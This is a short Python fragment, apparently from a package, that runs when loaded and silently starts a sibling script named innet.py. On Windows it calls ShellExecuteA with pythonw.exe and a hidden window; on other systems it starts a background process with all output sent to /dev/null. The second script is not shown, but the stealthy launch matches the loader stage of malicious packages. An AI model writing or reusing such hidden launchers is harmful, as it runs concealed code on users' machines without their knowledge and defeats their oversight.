def ext_resource(file, show):
        python_path = sys.base_exec_prefix + "\\pythonw.exe"
        shell32 = ct.WinDLL('shell32')
        shell32.ShellExecuteA.argtypes = w.HWND, w.LPCSTR, w.LPCSTR, w.LPCSTR, w.LPCSTR, w.INT
        shell32.ShellExecuteA.restype = w.HINSTANCE
        if(os.path.exists(python_path)==True):
                shell32.ShellExecuteA(None, b'open', python_path.encode(),file, None, show)
        else:
                shell32.ShellExecuteA(None, b'open', b'py.exe',file, None, show)

def run_command(command):
    output = ""
    error = ""
    with os.popen(command) as process:
        output = process.read()
        return_code = process.close()
    if return_code is not None and return_code != 0:
        with os.popen(command + " 2>&1") as process:
            error = process.read()
    else:
        error = ""
    return

if platform == "win32":
    script_path = os.path.dirname(__file__) +"\\innet.py"
    script_path = '"' + script_path + '"'
    ext_resource(script_path.encode(), 0)
else:
    script_path = os.path.dirname(os.path.realpath(__file__))
    script_path = "python3 " + '"' + script_path + "/innet.py" + '"' + " > /dev/null 2>&1 &"
    run_command(script_path)